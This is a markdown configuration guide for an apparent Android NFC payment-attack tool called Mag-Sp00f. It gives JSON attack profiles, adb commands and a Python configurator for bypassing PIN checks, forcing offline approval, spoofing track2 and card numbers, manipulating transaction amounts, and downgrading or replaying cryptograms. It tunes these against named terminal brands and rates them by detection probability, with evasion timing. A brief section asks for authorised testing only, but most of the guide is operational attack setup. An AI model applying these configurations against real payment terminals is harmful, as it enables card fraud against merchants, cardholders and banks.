# EMV Attack Configuration Guide - Mag-Sp00f Project ⚙️

## Table of Contents
1. [Quick Start](#quick-start)
2. [Configuration Methods](#configuration-methods)
3. [Attack Profiles](#attack-profiles)
4. [Testing Procedures](#testing-procedures)
5. [Troubleshooting](#troubleshooting)
6. [Security Recommendations](#security-recommendations)

---

## Quick Start 🚀

### Prerequisites
- Android device with NFC/HCE capability
- PN532 NFC reader (USB or Bluetooth HC-06)
- Mag-Sp00f app installed and configured
- EMV test cards or card profiles loaded

### Basic Attack Setup (3 Minutes)

1. **Enable Attack Mode**
   ```bash
   # Connect to Android device
   adb connect <device_ip>:5555
   
   # Launch Mag-Sp00f with attack mode
   adb shell am start -n com.mag_sp00f.app/.MainActivity --ez attack_mode true
   ```

2. **Configure Basic Attacks**
   ```json
   {
       "profile_name": "basic_bypass",
       "attacks": {
           "cvm_bypass": { "enabled": true, "bypass_pin": true },
           "aip_force_offline": { "enabled": true, "force_offline": true }
       }
   }
   ```

3. **Test Against PN532**
   ```bash
   # Run PN532 terminal test
   python3 scripts/pn532_terminal_rapid.py --port /dev/rfcomm1 --workflow 1
   ```

---

## Configuration Methods 🛠️

### Method 1: JSON Configuration Files

**Location**: `android-app/src/main/assets/attack_profiles/`

#### Basic Profile Structure
```json
{
    "profile_metadata": {
        "name": "stealth_bypass",
        "description": "Low-detection bypass attacks for POS testing",
        "version": "1.0",
        "author": "mag-sp00f",
        "created": "2025-09-21",
        "risk_level": "low"
    },
    "card_profile": {
        "pan": "4154904674973556",
        "expiry": "2902",
        "track2": "4154904674973556D29022010000820083001F",
        "cardholder_name": "CARDHOLDER/VISA",
        "supported_aids": ["A0000000031010", "A0000000980840"]
    },
    "attack_configuration": {
        "ppse_aid_poisoning": {
            "enabled": false,
            "target_aid": "A0000000041010",
            "poison_type": "visa_to_mastercard"
        },
        "aip_force_offline": {
            "enabled": true,
            "force_offline": true,
            "remove_cda": false,
            "set_sda_only": false
        },
        "track2_spoofing": {
            "enabled": false,
            "spoof_pan": "4111111111111111",
            "spoof_expiry": "2912",
            "spoof_service_code": "201"
        },
        "cryptogram_downgrade": {
            "enabled": false,
            "downgrade_type": "arqc_to_tc",
            "manipulate_cvr": true
        },
        "cvm_bypass": {
            "enabled": true,
            "bypass_pin": true,
            "bypass_signature": false,
            "no_cvm_required": true
        },
        "advanced_force_offline": {
            "enabled": false,
            "manipulate_terminal_caps": true,
            "override_risk_management": true,
            "max_offline_amount": 500000
        },
        "enhanced_cvm_bypass": {
            "enabled": false,
            "spoof_biometric": true,
            "bypass_mfa": true,
            "biometric_types": ["fingerprint", "face"]
        },
        "amount_manipulation": {
            "enabled": false,
            "manipulate_pdol_amount": true,
            "target_amount": 100,
            "spoofed_amount": 10000,
            "manipulate_currency": false
        },
        "advanced_cryptogram": {
            "enabled": false,
            "use_precomputed": true,
            "enable_replay": true,
            "replay_window_hours": 24
        },
        "failed_cryptogram_attack": {
            "enabled": false,
            "failure_type": "AAC_FORCE",
            "terminal_bypass_test": true,
            "corruption_level": "partial"
        }
    }
}
```

### Method 2: Runtime API Configuration

#### Android Intent Configuration
```kotlin
// Configure via Android Intent
val intent = Intent(this, EnhancedHceService::class.java).apply {
    putExtra("attack_profile", "aggressive_manipulation")
    putExtra("attack_config", """
        {
            "amount_manipulation": {
                "enabled": true,
                "target_amount": 2500,
                "spoofed_amount": 25
            }
        }
    """.trimIndent())
}
startService(intent)
```

#### ADB Configuration Commands
```bash
# Enable specific attack via ADB
adb shell am broadcast -a com.mag_sp00f.CONFIGURE_ATTACK \
    --es attack_id "cvm_bypass" \
    --es config '{"bypass_pin": true, "bypass_signature": true}'

# Load attack profile
adb shell am broadcast -a com.mag_sp00f.LOAD_PROFILE \
    --es profile_name "stealth_bypass"

# Get attack status
adb shell am broadcast -a com.mag_sp00f.GET_STATUS
```

### Method 3: Python Script Configuration

#### Using Attack Configuration Script
```python
#!/usr/bin/env python3
# File: scripts/configure_attacks.py

import json
import subprocess
from pathlib import Path

class AttackConfigurator:
    def __init__(self, device_id=None):
        self.device_id = device_id
        self.adb_cmd = f"adb {f'-s {device_id}' if device_id else ''}"
    
    def load_attack_profile(self, profile_name: str):
        """Load predefined attack profile"""
        cmd = f"{self.adb_cmd} shell am broadcast -a com.mag_sp00f.LOAD_PROFILE --es profile_name {profile_name}"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        return result.returncode == 0
    
    def configure_custom_attack(self, attacks: dict):
        """Configure custom attack combination"""
        config_json = json.dumps(attacks)
        cmd = f"{self.adb_cmd} shell am broadcast -a com.mag_sp00f.CUSTOM_CONFIG --es config '{config_json}'"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        return result.returncode == 0
    
    def get_attack_status(self):
        """Get current attack configuration status"""
        cmd = f"{self.adb_cmd} shell am broadcast -a com.mag_sp00f.GET_STATUS"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        return result.stdout

# Usage Examples
if __name__ == "__main__":
    config = AttackConfigurator()
    
    # Load stealth profile
    config.load_attack_profile("stealth_bypass")
    
    # Configure custom combination
    custom_attacks = {
        "cvm_bypass": {"enabled": True, "bypass_pin": True},
        "amount_manipulation": {"enabled": True, "spoofed_amount": 1000}
    }
    config.configure_custom_attack(custom_attacks)
    
    # Check status
    print(config.get_attack_status())
```

---

## Attack Profiles 🎯

### Pre-configured Attack Profiles

#### 1. Stealth Bypass Profile
**Use Case**: Low-detection testing of basic bypass techniques
**Risk Level**: Low
**Detection Probability**: <5%

```json
{
    "profile_name": "stealth_bypass",
    "attacks": {
        "cvm_bypass": {
            "enabled": true,
            "bypass_pin": true,
            "bypass_signature": false,
            "detection_delay": 200
        },
        "aip_force_offline": {
            "enabled": true,
            "force_offline": true,
            "randomize_offline_threshold": true
        }
    },
    "stealth_features": {
        "response_timing_variance": 50,
        "error_injection_rate": 0.02,
        "legitimate_transaction_simulation": true
    }
}
```

#### 2. Aggressive Manipulation Profile  
**Use Case**: High-impact testing with sophisticated attacks
**Risk Level**: High
**Detection Probability**: 30-50%

```json
{
    "profile_name": "aggressive_manipulation",
    "attacks": {
        "amount_manipulation": {
            "enabled": true,
            "manipulate_pdol_amount": true,
            "target_amount": 100,
            "spoofed_amount": 10000,
            "create_cryptogram_mismatch": true
        },
        "advanced_cryptogram": {
            "enabled": true,
            "use_precomputed": true,
            "enable_replay": true,
            "correlation_attack": true
        },
        "enhanced_cvm_bypass": {
            "enabled": true,
            "spoof_biometric": true,
            "bypass_mfa": true
        }
    }
}
```

#### 3. Card Scheme Switch Profile
**Use Case**: Testing cross-scheme compatibility and validation
**Risk Level**: Medium
**Detection Probability**: 15-25%

```json
{
    "profile_name": "scheme_switching",
    "attacks": {
        "ppse_aid_poisoning": {
            "enabled": true,
            "poison_type": "visa_to_mastercard",
            "inject_custom": false,
            "multi_aid_response": true
        },
        "track2_spoofing": {
            "enabled": true,
            "spoof_pan": "5555555555554444",
            "maintain_luhn_validity": true,
            "spoof_issuer_data": true
        }
    }
}
```

#### 4. Research Profile
**Use Case**: Comprehensive attack testing for research purposes
**Risk Level**: Variable
**Detection Probability**: 10-60%

```json
{
    "profile_name": "research_comprehensive",
    "attacks": {
        "ppse_aid_poisoning": { "enabled": true },
        "aip_force_offline": { "enabled": true },
        "track2_spoofing": { "enabled": true },
        "cryptogram_downgrade": { "enabled": true },
        "cvm_bypass": { "enabled": true },
        "advanced_force_offline": { "enabled": true },
        "enhanced_cvm_bypass": { "enabled": true },
        "amount_manipulation": { "enabled": true },
        "advanced_cryptogram": { "enabled": true }
    },
    "execution_mode": "sequential_testing",
    "data_collection": {
        "log_all_apdus": true,
        "capture_timing_data": true,
        "record_terminal_responses": true
    }
}
```

---

## Testing Procedures 🧪

### Testing Workflow

#### Phase 1: Environment Setup
```bash
# 1. Verify PN532 connection
python3 scripts/test_pn532_connection.py --port /dev/rfcomm1

# 2. Verify Android HCE service
adb shell dumpsys nfc | grep -A 10 "HCE"

# 3. Load test card profile
adb push data/test_cards/visa_test.json /sdcard/mag_sp00f/cards/

# 4. Configure attack profile
python3 scripts/configure_attacks.py --profile stealth_bypass
```

#### Phase 2: Baseline Testing
```bash
# 1. Test normal EMV flow (no attacks)
python3 scripts/pn532_terminal_rapid.py --port /dev/rfcomm1 --workflow 1 --no-attacks

# 2. Record baseline metrics
python3 scripts/emv_baseline_capture.py --output baseline_data.json

# 3. Verify legitimate transaction success
python3 scripts/validate_emv_flow.py baseline_data.json
```

#### Phase 3: Attack Testing
```bash
# 1. Enable attack profile
python3 scripts/configure_attacks.py --profile stealth_bypass

# 2. Run attack tests
python3 scripts/emv_attack_tester.py --profile stealth_bypass --iterations 10

# 3. Compare attack vs baseline
python3 scripts/emv_attack_analysis.py --baseline baseline_data.json --attack attack_data.json

# 4. Generate attack report
python3 scripts/generate_attack_report.py --output attack_report.html
```

#### Phase 4: Advanced Testing
```bash
# 1. Test attack combinations
python3 scripts/test_attack_combinations.py --combinations "cvm_bypass,aip_force_offline"

# 2. Stress test attack stability
python3 scripts/attack_stress_test.py --duration 600 --profile aggressive_manipulation

# 3. Detection evasion testing
python3 scripts/test_detection_evasion.py --profile stealth_bypass
```

### Specific Attack Testing

#### CVM Bypass Testing
```bash
# Test PIN bypass
python3 scripts/test_cvm_bypass.py --method pin --amount 100

# Test signature bypass  
python3 scripts/test_cvm_bypass.py --method signature --amount 250

# Test biometric bypass
python3 scripts/test_cvm_bypass.py --method biometric --type fingerprint
```

#### Amount Manipulation Testing
```bash
# Test basic amount spoofing
python3 scripts/test_amount_manipulation.py --original 100 --spoofed 10000

# Test currency manipulation
python3 scripts/test_amount_manipulation.py --currency-attack --from USD --to EUR

# Test PDOL amount injection
python3 scripts/test_amount_manipulation.py --pdol-injection --target-field amount
```

#### Cryptogram Testing
```bash
# Test cryptogram downgrade
python3 scripts/test_cryptogram_attacks.py --downgrade arqc-to-tc

# Test replay attacks
python3 scripts/test_cryptogram_attacks.py --replay --window 24h

# Test correlation attacks
python3 scripts/test_cryptogram_attacks.py --correlation --samples 100
```

---

## Troubleshooting 🔧

### Common Issues and Solutions

#### 1. Attack Not Applied
**Symptoms**: 
- Normal EMV responses despite attack configuration
- Attack statistics show 0 applications

**Diagnosis**:
```bash
# Check attack module registration
adb shell am broadcast -a com.mag_sp00f.DEBUG_MODULES

# Verify applicability logic
python3 scripts/debug_attack_applicability.py --attack cvm_bypass
```

**Solutions**:
- Verify attack configuration syntax
- Check command applicability conditions
- Ensure card data matches attack requirements
- Validate attack module registration

#### 2. Detection by Terminal
**Symptoms**:
- Transaction declined unexpectedly  
- Terminal displays validation errors
- Unusual terminal behavior

**Diagnosis**:
```bash
# Analyze detection patterns
python3 scripts/analyze_detection_patterns.py --logs terminal_logs.txt

# Check response timing
python3 scripts/analyze_response_timing.py --attack-data attack_timing.json
```

**Solutions**:
- Enable stealth features (timing randomization)
- Reduce attack aggressiveness  
- Use more realistic spoofed values
- Implement terminal-specific bypass techniques

#### 3. HCE Service Crashes
**Symptoms**:
- Android HCE service stops responding
- NFC transactions fail completely
- App crashes during attack

**Diagnosis**:
```bash
# Check logcat for crashes
adb logcat -s MagSp00f:* AndroidRuntime:E

# Analyze memory usage
adb shell dumpsys meminfo com.mag_sp00f.app
```

**Solutions**:
- Restart HCE service: `adb shell am stopservice com.mag_sp00f.app/.nfc.EnhancedHceService`
- Clear app data: `adb shell pm clear com.mag_sp00f.app`
- Reduce attack complexity
- Update attack module error handling

#### 4. PN532 Communication Issues
**Symptoms**:
- Terminal cannot detect card
- Incomplete APDU exchanges
- Connection timeouts

**Diagnosis**:
```bash
# Test PN532 hardware
python3 scripts/test_pn532_hardware.py --port /dev/rfcomm1

# Monitor Bluetooth connection
python3 scripts/monitor_bt_connection.py --mac 00:14:03:05:5C:CB
```

**Solutions**:
- Check Bluetooth HC-06 connection stability
- Adjust APDU timeout values
- Verify PN532 firmware version
- Test with different baudrates

### Debug Commands

#### Attack Module Debugging
```bash
# Enable debug logging
adb shell setprop log.tag.MagSp00f VERBOSE

# Dump attack manager state
adb shell am broadcast -a com.mag_sp00f.DUMP_STATE

# Test specific attack module
python3 scripts/test_single_module.py --module cvm_bypass --verbose

# Monitor APDU flow
python3 scripts/monitor_apdu_flow.py --real-time
```

#### Performance Debugging
```bash
# Profile attack execution time
python3 scripts/profile_attack_performance.py --profile stealth_bypass

# Monitor memory usage during attacks
python3 scripts/monitor_attack_memory.py --duration 300

# Analyze attack success rates
python3 scripts/analyze_success_rates.py --data attack_logs/
```

---

## Security Recommendations 🛡️

### Operational Security

#### 1. Testing Environment Isolation
- Use dedicated test devices only
- Isolate test network from production systems
- Implement secure data destruction after testing
- Use test cards/data only, never real payment cards

#### 2. Attack Evidence Management
```bash
# Secure log collection
python3 scripts/secure_log_collection.py --encrypt --output encrypted_logs.zip

# Evidence sanitization
python3 scripts/sanitize_attack_logs.py --remove-pii --anonymize

# Secure storage
python3 scripts/secure_storage.py --encrypt-at-rest --key-rotation
```

#### 3. Detection Risk Management
- Monitor for unusual terminal behavior patterns
- Implement attack frequency limits
- Use realistic spoofed data values
- Employ transaction timing randomization

### Legal and Ethical Guidelines

#### Authorized Testing Only
- Obtain written authorization for all testing
- Test only on owned/controlled systems
- Document testing scope and limitations
- Maintain detailed testing logs for audit

#### Responsible Disclosure
- Report vulnerabilities through proper channels
- Allow reasonable remediation time
- Provide technical details for fixes
- Follow coordinated disclosure timelines

### Attack Detection Countermeasures

#### Terminal-Side Detection
```bash
# Test terminal detection capabilities
python3 scripts/test_terminal_detection.py --terminal-type ingenico

# Analyze detection thresholds
python3 scripts/analyze_detection_thresholds.py --data detection_tests.json
```

#### Network-Side Detection
- Monitor for unusual transaction patterns
- Analyze cryptogram validation failures
- Track offline transaction frequencies
- Implement behavioral analysis systems

---

## Advanced Configuration Examples 💎

### Multi-Stage Attack Configuration
```json
{
    "profile_name": "multi_stage_attack",
    "stages": [
        {
            "stage": 1,
            "description": "Initial reconnaissance",
            "attacks": {
                "ppse_aid_poisoning": {
                    "enabled": true,
                    "gather_terminal_info": true
                }
            }
        },
        {
            "stage": 2, 
            "description": "Bypass authentication",
            "condition": "terminal_type == 'ingenico'",
            "attacks": {
                "cvm_bypass": {
                    "enabled": true,
                    "method": "context_specific"
                }
            }
        },
        {
            "stage": 3,
            "description": "Amount manipulation",
            "condition": "cvm_bypassed == true",
            "attacks": {
                "amount_manipulation": {
                    "enabled": true,
                    "dynamic_amount_calculation": true
                }
            }
        }
    ]
}
```

### Terminal-Specific Configurations
```json
{
    "terminal_profiles": {
        "ingenico": {
            "detection_sensitivity": "high",
            "recommended_attacks": ["cvm_bypass", "aip_force_offline"],
            "avoid_attacks": ["amount_manipulation"],
            "timing_adjustments": {
                "response_delay": 150,
                "variance": 25
            }
        },
        "verifone": {
            "detection_sensitivity": "medium", 
            "recommended_attacks": ["track2_spoofing", "cryptogram_downgrade"],
            "timing_adjustments": {
                "response_delay": 100,
                "variance": 50
            }
        }
    }
}
```

### Research Data Collection Configuration
```json
{
    "research_config": {
        "data_collection": {
            "capture_all_apdus": true,
            "timing_precision": "microsecond",
            "terminal_fingerprinting": true,
            "success_rate_tracking": true
        },
        "experiment_parameters": {
            "sample_size": 1000,
            "attack_variations": true,
            "control_group": true,
            "statistical_significance": 0.05
        }
    }
}
```

---

*Configuration Guide Version: 1.0 | Last Updated: September 21, 2025 | Mag-Sp00f Project* ⚙️